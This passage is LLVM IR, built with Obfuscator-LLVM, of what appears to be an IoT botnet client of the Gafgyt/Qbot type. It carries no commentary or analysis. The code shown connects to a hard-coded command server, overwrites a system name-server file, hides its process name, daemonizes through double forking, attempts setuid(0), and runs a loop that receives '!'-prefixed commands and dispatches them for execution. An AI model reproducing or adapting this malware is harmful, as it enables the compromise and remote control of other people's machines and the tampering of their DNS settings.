  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #5
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #9
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #9
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #9
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #9
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.564, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %51

; <label>:48:                                     ; preds = %2
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* %7, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %65, label %54

; <label>:54:                                     ; preds = %51
  %55 = call i32 @fork() #5
  store i32 %55, i32* %8, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %54
  call void @exit(i32 0) #12
  unreachable

; <label>:58:                                     ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %58
  br label %63

; <label>:62:                                     ; preds = %58
  br label %63

; <label>:63:                                     ; preds = %62, %61
  br label %64

; <label>:64:                                     ; preds = %63
  br label %66

; <label>:65:                                     ; preds = %51
  br label %66

; <label>:66:                                     ; preds = %65, %64
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.571, i32 0, i32 0)) #5
  %69 = call i32 @setuid(i32 0) #5
  %70 = call i32 @seteuid(i32 0) #5
  %71 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %72

; <label>:72:                                     ; preds = %78, %67
  %73 = call i32 @fork() #5
  %74 = icmp eq i32 %73, 0
  br i1 %74, label %75, label %341

; <label>:75:                                     ; preds = %72
  %76 = call i32 @initConnection()
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %80

; <label>:78:                                     ; preds = %75
  %79 = call i32 @sleep(i32 5)
  br label %72

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i8* @getBuild()
  %83 = call i32 @getEndianness()
  %84 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.572, i32 0, i32 0), i8* %82, i32 %83)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %85

; <label>:85:                                     ; preds = %339, %210, %174, %80
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %88 = call i32 @recvLine(i32 %86, i8* %87, i32 4096)
  store i32 %88, i32* %11, align 4
  %89 = icmp ne i32 %88, -1
  br i1 %89, label %90, label %340

; <label>:90:                                     ; preds = %85
  store i32 0, i32* %12, align 4
  br label %91

; <label>:91:                                     ; preds = %162, %90
  %92 = load i32, i32* %12, align 4
  %93 = sext i32 %92 to i64
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %96, label %165

; <label>:96:                                     ; preds = %91
  %97 = load i32*, i32** @pids, align 8
  %98 = load i32, i32* %12, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @waitpid(i32 %101, i32* null, i32 1)
  %103 = icmp sgt i32 %102, 0
  br i1 %103, label %104, label %161

; <label>:104:                                    ; preds = %96
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %14, align 4
  br label %107

; <label>:107:                                    ; preds = %123, %104
  %108 = load i32, i32* %14, align 4
  %109 = zext i32 %108 to i64
  %110 = load i64, i64* @numpids, align 8
  %111 = icmp ult i64 %109, %110
  br i1 %111, label %112, label %126

; <label>:112:                                    ; preds = %107
  %113 = load i32*, i32** @pids, align 8
  %114 = load i32, i32* %14, align 4
  %115 = zext i32 %114 to i64
  %116 = getelementptr inbounds i32, i32* %113, i64 %115
  %117 = load i32, i32* %116, align 4
  %118 = load i32*, i32** @pids, align 8
  %119 = load i32, i32* %14, align 4
  %120 = sub i32 %119, 1
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds i32, i32* %118, i64 %121
  store i32 %117, i32* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %112
  %124 = load i32, i32* %14, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %14, align 4
  br label %107

; <label>:126:                                    ; preds = %107
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = sub i32 %128, 1
  %130 = zext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %127, i64 %130
  store i32 0, i32* %131, align 4
  %132 = load i64, i64* @numpids, align 8
  %133 = add i64 %132, -1
  store i64 %133, i64* @numpids, align 8
  %134 = load i64, i64* @numpids, align 8
  %135 = add i64 %134, 1
  %136 = mul i64 %135, 4
  %137 = call noalias i8* @malloc(i64 %136) #5
  %138 = bitcast i8* %137 to i32*
  store i32* %138, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %139

; <label>:139:                                    ; preds = %154, %126
  %140 = load i32, i32* %14, align 4
  %141 = zext i32 %140 to i64
  %142 = load i64, i64* @numpids, align 8
  %143 = icmp ult i64 %141, %142
  br i1 %143, label %144, label %157

; <label>:144:                                    ; preds = %139
  %145 = load i32*, i32** @pids, align 8
  %146 = load i32, i32* %14, align 4
  %147 = zext i32 %146 to i64
  %148 = getelementptr inbounds i32, i32* %145, i64 %147
  %149 = load i32, i32* %148, align 4
  %150 = load i32*, i32** %13, align 8
  %151 = load i32, i32* %14, align 4
  %152 = zext i32 %151 to i64
  %153 = getelementptr inbounds i32, i32* %150, i64 %152
  store i32 %149, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %144
  %155 = load i32, i32* %14, align 4
  %156 = add i32 %155, 1
  store i32 %156, i32* %14, align 4
  br label %139

; <label>:157:                                    ; preds = %139
  %158 = load i32*, i32** @pids, align 8
  %159 = bitcast i32* %158 to i8*
  call void @free(i8* %159) #5
  %160 = load i32*, i32** %13, align 8
  store i32* %160, i32** @pids, align 8
  br label %161

; <label>:161:                                    ; preds = %157, %96
  br label %162

; <label>:162:                                    ; preds = %161
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %12, align 4
  br label %91

; <label>:165:                                    ; preds = %91
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %167
  store i8 0, i8* %168, align 1
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %169)
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %171 = call i8* @strstr(i8* %170, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i32 0, i32 0)) #9
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %173 = icmp eq i8* %171, %172
  br i1 %173, label %174, label %175

; <label>:174:                                    ; preds = %165
  br label %85

; <label>:175:                                    ; preds = %165
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %177 = call i8* @strstr(i8* %176, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.573, i32 0, i32 0)) #9
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %179 = icmp eq i8* %177, %178
  br i1 %179, label %180, label %181

; <label>:180:                                    ; preds = %175
  call void @exit(i32 0) #12
  unreachable

; <label>:181:                                    ; preds = %175
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %182, i8** %15, align 8
  %183 = load i8*, i8** %15, align 8
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 33
  br i1 %186, label %187, label %339

; <label>:187:                                    ; preds = %181
  %188 = load i8*, i8** %15, align 8
  %189 = getelementptr inbounds i8, i8* %188, i64 1
  store i8* %189, i8** %16, align 8
  br label %190

; <label>:190:                                    ; preds = %202, %187
  %191 = load i8*, i8** %16, align 8
  %192 = load i8, i8* %191, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp ne i32 %193, 32
  br i1 %194, label %195, label %200

; <label>:195:                                    ; preds = %190
  %196 = load i8*, i8** %16, align 8
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp ne i32 %198, 0
  br label %200

; <label>:200:                                    ; preds = %195, %190
  %201 = phi i1 [ false, %190 ], [ %199, %195 ]
  br i1 %201, label %202, label %205

; <label>:202:                                    ; preds = %200
  %203 = load i8*, i8** %16, align 8
  %204 = getelementptr inbounds i8, i8* %203, i32 1
  store i8* %204, i8** %16, align 8
  br label %190

; <label>:205:                                    ; preds = %200
  %206 = load i8*, i8** %16, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 0
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %205
  br label %85

; <label>:211:                                    ; preds = %205
  %212 = load i8*, i8** %16, align 8
  store i8 0, i8* %212, align 1
  %213 = load i8*, i8** %15, align 8
  %214 = getelementptr inbounds i8, i8* %213, i64 1
  store i8* %214, i8** %16, align 8
  %215 = load i8*, i8** %15, align 8
  %216 = load i8*, i8** %16, align 8
  %217 = call i64 @strlen(i8* %216) #9
  %218 = getelementptr inbounds i8, i8* %215, i64 %217
  %219 = getelementptr inbounds i8, i8* %218, i64 2
  store i8* %219, i8** %15, align 8
  br label %220

; <label>:220:                                    ; preds = %240, %211
  %221 = load i8*, i8** %15, align 8
  %222 = load i8*, i8** %15, align 8
  %223 = call i64 @strlen(i8* %222) #9
  %224 = sub i64 %223, 1
  %225 = getelementptr inbounds i8, i8* %221, i64 %224
  %226 = load i8, i8* %225, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp eq i32 %227, 10
  br i1 %228, label %238, label %229

; <label>:229:                                    ; preds = %220
  %230 = load i8*, i8** %15, align 8
  %231 = load i8*, i8** %15, align 8
  %232 = call i64 @strlen(i8* %231) #9
  %233 = sub i64 %232, 1
  %234 = getelementptr inbounds i8, i8* %230, i64 %233
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 13
  br label %238

; <label>:238:                                    ; preds = %229, %220
  %239 = phi i1 [ true, %220 ], [ %237, %229 ]
  br i1 %239, label %240, label %246

; <label>:240:                                    ; preds = %238
  %241 = load i8*, i8** %15, align 8
  %242 = load i8*, i8** %15, align 8
  %243 = call i64 @strlen(i8* %242) #9
  %244 = sub i64 %243, 1
  %245 = getelementptr inbounds i8, i8* %241, i64 %244
  store i8 0, i8* %245, align 1
  br label %220

; <label>:246:                                    ; preds = %238
  %247 = load i8*, i8** %15, align 8
  store i8* %247, i8** %17, align 8
  br label %248

; <label>:248:                                    ; preds = %260, %246
  %249 = load i8*, i8** %15, align 8
  %250 = load i8, i8* %249, align 1
  %251 = zext i8 %250 to i32
  %252 = icmp ne i32 %251, 32
  br i1 %252, label %253, label %258

; <label>:253:                                    ; preds = %248
  %254 = load i8*, i8** %15, align 8
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp ne i32 %256, 0
  br label %258

; <label>:258:                                    ; preds = %253, %248
  %259 = phi i1 [ false, %248 ], [ %257, %253 ]
  br i1 %259, label %260, label %263

; <label>:260:                                    ; preds = %258
  %261 = load i8*, i8** %15, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %15, align 8
  br label %248

; <label>:263:                                    ; preds = %258
  %264 = load i8*, i8** %15, align 8
  store i8 0, i8* %264, align 1
  %265 = load i8*, i8** %15, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %15, align 8
  %267 = load i8*, i8** %17, align 8
  store i8* %267, i8** %18, align 8
  br label %268

; <label>:268:                                    ; preds = %272, %263
  %269 = load i8*, i8** %18, align 8
  %270 = load i8, i8* %269, align 1
  %271 = icmp ne i8 %270, 0
  br i1 %271, label %272, label %281

; <label>:272:                                    ; preds = %268
  %273 = load i8*, i8** %18, align 8
  %274 = load i8, i8* %273, align 1
  %275 = zext i8 %274 to i32
  %276 = call i32 @toupper(i32 %275) #9
  %277 = trunc i32 %276 to i8
  %278 = load i8*, i8** %18, align 8
  store i8 %277, i8* %278, align 1
  %279 = load i8*, i8** %18, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %18, align 8
  br label %268

; <label>:281:                                    ; preds = %268
  store i32 1, i32* %20, align 4
  %282 = load i8*, i8** %15, align 8
  %283 = call i8* @strtok(i8* %282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.574, i32 0, i32 0)) #5
  store i8* %283, i8** %21, align 8
  %284 = load i8*, i8** %17, align 8
  %285 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %284, i8** %285, align 16
  br label %286

; <label>:286:                                    ; preds = %317, %281
  %287 = load i8*, i8** %21, align 8
  %288 = icmp ne i8* %287, null
  br i1 %288, label %289, label %319

; <label>:289:                                    ; preds = %286
  %290 = load i8*, i8** %21, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  %293 = icmp ne i32 %292, 10
  br i1 %293, label %294, label %317

; <label>:294:                                    ; preds = %289
  %295 = load i8*, i8** %21, align 8
  %296 = call i64 @strlen(i8* %295) #9
  %297 = add i64 %296, 1
  %298 = call noalias i8* @malloc(i64 %297) #5
  %299 = load i32, i32* %20, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %300
  store i8* %298, i8** %301, align 8
  %302 = load i32, i32* %20, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %303
  %305 = load i8*, i8** %304, align 8
  %306 = load i8*, i8** %21, align 8
  %307 = call i64 @strlen(i8* %306) #9
  %308 = add i64 %307, 1
  call void @llvm.memset.p0i8.i64(i8* %305, i8 0, i64 %308, i32 1, i1 false)
  %309 = load i32, i32* %20, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %310
  %312 = load i8*, i8** %311, align 8
  %313 = load i8*, i8** %21, align 8
  %314 = call i8* @strcpy(i8* %312, i8* %313) #5
  %315 = load i32, i32* %20, align 4
  %316 = add nsw i32 %315, 1
  store i32 %316, i32* %20, align 4
  br label %317

; <label>:317:                                    ; preds = %294, %289
  %318 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.574, i32 0, i32 0)) #5
  store i8* %318, i8** %21, align 8
  br label %286

; <label>:319:                                    ; preds = %286
  %320 = load i32, i32* %20, align 4
  %321 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %320, i8** %321)
  %322 = load i32, i32* %20, align 4
  %323 = icmp sgt i32 %322, 1
  br i1 %323, label %324, label %338

; <label>:324:                                    ; preds = %319
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %325

; <label>:325:                                    ; preds = %334, %324
  %326 = load i32, i32* %22, align 4
  %327 = load i32, i32* %20, align 4
  %328 = icmp slt i32 %326, %327
  br i1 %328, label %329, label %337

; <label>:329:                                    ; preds = %325
  %330 = load i32, i32* %22, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  call void @free(i8* %333) #5
  br label %334

; <label>:334:                                    ; preds = %329
  %335 = load i32, i32* %22, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %22, align 4
  br label %325

; <label>:337:                                    ; preds = %325
  br label %338

; <label>:338:                                    ; preds = %337, %319
  br label %339

; <label>:339:                                    ; preds = %338, %181
  br label %85

; <label>:340:                                    ; preds = %85
  br label %341

; <label>:341:                                    ; preds = %340, %72
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146506763}
!2 = !{i32 -2146505635}
!3 = !{i32 -2146504944}
!4 = !{i32 -2146504195}
!5 = !{i32 -2146503256}
!6 = !{i32 -2146502167}
